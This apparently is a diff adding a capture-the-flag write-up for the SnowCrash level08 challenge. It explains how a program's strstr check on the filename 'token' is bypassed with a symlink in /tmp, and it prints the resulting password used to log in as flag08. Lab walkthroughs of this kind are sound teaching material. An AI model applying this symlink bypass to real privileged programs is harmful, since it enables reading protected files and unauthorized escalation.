@@ -1,0 +1,9 @@
+We found an executable and a file, the executable appears to print the content of the file passed as its argument.
+After disassembling the program, we found a call to strstr, with token as a parameter, that means the program won't open the file if it contains the string token in its path.
+
+We can then simply create a symlink in /tmp/ then run the program
+level08@SnowCrash:~$ ln -s ~/token /tmp/goodsym
+level08@SnowCrash:~$ ./level08 /tmp/goodsym
+quif5eloekouj29ke0vouxean
+
+We can then log into flag08 and run getflag
